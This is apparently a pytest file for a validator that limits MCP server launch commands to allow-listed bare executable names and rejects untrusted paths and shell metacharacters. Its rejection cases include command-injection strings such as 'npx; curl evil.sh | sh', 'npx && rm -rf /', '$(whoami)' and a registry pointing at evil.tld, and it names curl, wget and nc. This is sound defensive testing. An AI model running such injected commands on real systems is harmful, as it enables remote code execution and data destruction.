"""MCP stdio `command` must be an allow-listed bare executable name.

`command` originates from workspace/user MCP config — untrusted input that a
workspace owner controls. It is handed to ``subprocess.Popen`` inside the
backend process, which holds the Docker socket, so an unvalidated value there
is arbitrary command execution with backend privileges.

Two independent guards are pinned here:

1. ``ptc_agent.config.core.validate_mcp_command`` — enforced by the
   ``MCPServerConfig`` field validator at config-load time.
2. ``mcp_client_runtime.validate_mcp_command`` — the inlined copy in the
   sandbox-side module, which re-checks at spawn time because that module also
   receives configs injected via ``_apply_config_dict`` that never pass through
   the Pydantic model.

The two lists must stay in lockstep; a test below asserts exactly that.
"""

from __future__ import annotations

import pytest

from ptc_agent.config.core import (
    _MCP_ALLOWED_COMMANDS as CONFIG_ALLOWED,
    MCPServerConfig,
    validate_mcp_command,
)
from ptc_agent.core.sandbox.mcp_client_runtime import (
    _MCP_ALLOWED_COMMANDS as RUNTIME_ALLOWED,
    validate_mcp_command as runtime_validate,
)


# ---------------------------------------------------------------------------
# The two copies must not drift
# ---------------------------------------------------------------------------


def test_allow_lists_are_identical():
    """Config-side and runtime-side allow-lists must match exactly.

    They are duplicated rather than imported because the runtime module executes
    in the sandbox interpreter, where ``ptc_agent.config`` is not importable.
    Drift would silently open a hole on whichever side is laxer.
    """
    assert CONFIG_ALLOWED == RUNTIME_ALLOWED


# ---------------------------------------------------------------------------
# Accepted values
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    ["npx", "node", "uvx", "uv", "python3", "deno", "bun", "docker"],
)
def test_allowlisted_commands_pass(command):
    assert validate_mcp_command(command) == command
    assert runtime_validate(command) == command


def test_none_and_blank_are_passthrough_none():
    """Absent command is allowed here — transport-level checks own 'required'."""
    assert validate_mcp_command(None) is None
    assert validate_mcp_command("") is None
    assert validate_mcp_command("   ") is None


def test_surrounding_whitespace_is_normalised():
    assert validate_mcp_command("  npx  ") == "npx"


# ---------------------------------------------------------------------------
# Rejected values — the actual attack surface
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        # Absolute / relative paths: escaping the PATH lookup
        "/bin/bash",
        "/usr/bin/curl",
        "./evil",
        "../../tmp/payload",
        "~/evil",
        # Extensions: a bare .sh is a script, not an allow-listed binary
        "evil.sh",
        "run.py",
        "payload.exe",
        # Not on the list, plain and simple
        "bash",
        "sh",
        "curl",
        "wget",
        "nc",
        "rm",
        # Injection attempts that would only matter if a shell were involved,
        # but are rejected on principle (defence in depth)
        "npx; curl evil.sh | sh",
        "npx && rm -rf /",
        "$(whoami)",
        "`id`",
        "npx --registry=https://evil.tld",
        "npx\necho pwned",
        "",
    ],
)
def test_dangerous_commands_are_rejected(command):
    if not command.strip():
        pytest.skip("blank is handled by the passthrough test")

    with pytest.raises(ValueError):
        validate_mcp_command(command)
    with pytest.raises(ValueError):
        runtime_validate(command)


def test_error_message_names_the_offending_value():
    """Operators need to know which server config to fix."""
    with pytest.raises(ValueError, match="/bin/bash"):
        validate_mcp_command("/bin/bash")

    with pytest.raises(ValueError, match="not allow-listed"):
        validate_mcp_command("bash")


# ---------------------------------------------------------------------------
# Enforcement through the Pydantic model
# ---------------------------------------------------------------------------


def test_model_rejects_disallowed_command():
    with pytest.raises(ValueError, match="not allow-listed"):
        MCPServerConfig(name="evil", transport="stdio", command="bash")


def test_model_rejects_path_command():
    with pytest.raises(ValueError, match="bare executable name"):
        MCPServerConfig(name="evil", transport="stdio", command="/bin/bash")


def test_model_accepts_allowlisted_command():
    cfg = MCPServerConfig(
        name="filesystem",
        transport="stdio",
        command="npx",
        args=["-y", "@modelcontextprotocol/server-filesystem", "/workspace"],
    )
    assert cfg.command == "npx"


def test_non_stdio_server_needs_no_command():
    """SSE/HTTP servers legitimately omit `command`."""
    cfg = MCPServerConfig(
        name="remote", transport="http", url="https://example.test/mcp"
    )
    assert cfg.command is None


# ---------------------------------------------------------------------------
# Trust-tier split: the rule differs by source, and must not be bypassable
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [".venv/bin/python", "./venv/bin/python3", "/app/.venv/bin/python3"],
)
def test_builtin_may_use_project_interpreter(command):
    """Bundled plugins launch via the project's own interpreter.

    `.venv/bin/python` is how every file under plugins/ declares its server,
    and `/app/.venv/bin/python3` is what sys.executable resolves to in the
    image. Both are first-party code paths.
    """
    assert validate_mcp_command(command, source="builtin") == command
    assert runtime_validate(command, source="builtin") == command


@pytest.mark.parametrize(
    "command",
    [
        "/bin/bash",          # outside the trusted roots
        "/tmp/evil",          # writable scratch space
        "/usr/bin/curl",      # network fetch tool
        "../evil/python",     # traversal
        "/app/../bin/bash",   # traversal expressed as an allowed prefix
        "/evil/python",       # absolute but untrusted, python basename
        "/app/evil.sh",       # trusted root but not an interpreter
    ],
)
def test_builtin_exception_is_not_a_loophole(command):
    """The trusted-interpreter carve-out must not become a general escape."""
    with pytest.raises(ValueError):
        validate_mcp_command(command, source="builtin")
    with pytest.raises(ValueError):
        runtime_validate(command, source="builtin")


@pytest.mark.parametrize(
    "command",
    [".venv/bin/python", "/app/.venv/bin/python3", "python3.13/bin/python"],
)
def test_workspace_may_not_use_paths_at_all(command):
    """Untrusted sources get the strict rule: bare names only."""
    with pytest.raises(ValueError):
        validate_mcp_command(command, source="workspace")
    with pytest.raises(ValueError):
        runtime_validate(command, source="workspace")


def test_workspace_still_may_use_allowlisted_bare_names():
    assert validate_mcp_command("npx", source="workspace") == "npx"
    assert validate_mcp_command("uvx", source="user") == "uvx"


def test_runtime_defaults_to_strict_when_source_is_unknown():
    """Failing closed: an unknown source must not inherit the builtin carve-out."""
    with pytest.raises(ValueError):
        runtime_validate("/app/.venv/bin/python3", source="something-else")
